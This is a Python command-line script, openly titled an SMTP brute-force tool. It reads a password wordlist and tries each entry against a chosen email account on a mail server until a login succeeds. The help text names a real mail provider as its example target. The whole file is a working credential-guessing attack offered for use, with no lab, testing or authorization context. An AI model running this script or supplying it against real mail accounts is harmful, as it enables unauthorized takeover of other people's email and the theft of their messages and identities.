import smtplib
import argparse
from socket import gaierror
from time import sleep

def brute_force_smtp(host, port, username, wordlist_file, use_ssl):
    try:
        with open(wordlist_file, 'r') as f:
            passwords = f.readlines()
    except FileNotFoundError:
        print("[ERROR] Wordlist file not found.")
        return

    # Choose the appropriate SMTP connection method
    try:
        if use_ssl:
            server = smtplib.SMTP_SSL(host, port, timeout=10)  # Use SSL for connection
            print(f"[INFO] Connected to {host}:{port} using SSL")
        else:
            server = smtplib.SMTP(host, port, timeout=10)  # Use non-SSL SMTP
            server.set_debuglevel(0)
            server.ehlo()
            print(f"[INFO] Connected to {host}:{port} without SSL")
    except (gaierror, smtplib.SMTPConnectError):
        print("[ERROR] Could not connect to the SMTP server.")
        return

    for password in passwords:
        password = password.strip()  # Clean up newlines/spaces
        print(f"[TRYING] Current passphrase {password}")

        try:
            # Try to log in with the current password
            server.login(username, password)
            print(f"[SUCCESS] KEY FOUND! [{password}]")
            server.quit()
            return
        except smtplib.SMTPAuthenticationError:
            print(f"[FAIL] {password} - Invalid password.")
        except smtplib.SMTPException as e:
            print(f"[ERROR] {e}")

        # Small delay to avoid hammering the server too fast
        sleep(1)

    print("[ERROR] Password not found in wordlist.")

def main():
    parser = argparse.ArgumentParser(description="SMTP Brute Force Tool")
    parser.add_argument("-s", "--service", required=True, help="SMTP service (e.g., smtp.seznam.cz)")
    parser.add_argument("-p", "--port", type=int, default=25, help="SMTP port (default: 25)")
    parser.add_argument("-u", "--username", required=True, help="Username (email address)")
    parser.add_argument("-P", "--wordlist", required=True, help="Wordlist file for password guesses")
    parser.add_argument("-S", "--ssl", action='store_true', help="Enable SSL (for SMTPS)")

    args = parser.parse_args()

    brute_force_smtp(args.service, args.port, args.username, args.wordlist, args.ssl)

if __name__ == "__main__":
    main()
